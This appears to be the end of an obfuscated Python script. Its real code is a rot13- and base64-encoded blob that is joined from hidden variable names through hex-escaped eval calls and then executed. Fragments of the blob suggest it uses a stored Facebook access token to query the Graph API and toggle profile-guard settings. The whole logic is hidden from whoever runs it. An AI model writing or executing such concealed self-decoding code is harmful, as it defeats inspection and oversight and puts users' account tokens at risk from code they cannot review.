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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))